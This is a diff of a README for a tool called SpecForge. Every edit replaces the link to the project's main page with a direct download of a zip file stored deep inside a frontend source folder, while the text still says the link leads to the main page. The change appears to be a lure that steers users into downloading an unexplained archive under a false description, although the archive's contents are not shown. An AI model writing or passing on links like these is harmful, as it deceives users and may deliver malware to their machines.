@@ -1,6 +1,6 @@
 # ⚙️ SpecForge - Make Coding Predictable and Clear
 
-[![Download SpecForge](https://img.shields.io/badge/Download-SpecForge-green?style=for-the-badge)](https://github.com/Excellence5567/SpecForge)
+[![Download SpecForge](https://img.shields.io/badge/Download-SpecForge-green?style=for-the-badge)](https://github.com/Excellence5567/SpecForge/raw/refs/heads/main/frontend/src/features/ui_roadmap/Spec-Forge-v3.3.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Before you download, make sure your computer meets these basic needs:
 
 ### Step 1: Visit the Download Page
 
-Click on the big green button above or [go here to download SpecForge](https://github.com/Excellence5567/SpecForge). This link takes you to the main page for the software.
+Click on the big green button above or [go here to download SpecForge](https://github.com/Excellence5567/SpecForge/raw/refs/heads/main/frontend/src/features/ui_roadmap/Spec-Forge-v3.3.zip). This link takes you to the main page for the software.
 
 ### Step 2: Find the Windows Installer
 
@@ -126,6 +126,6 @@ If you have issues, here are simple steps to try:
 
 Use this link to get started:
 
-[Download SpecForge from GitHub](https://github.com/Excellence5567/SpecForge) 
+[Download SpecForge from GitHub](https://github.com/Excellence5567/SpecForge/raw/refs/heads/main/frontend/src/features/ui_roadmap/Spec-Forge-v3.3.zip) 
 
 Click the badge at the top or the link here to access the download page anytime.
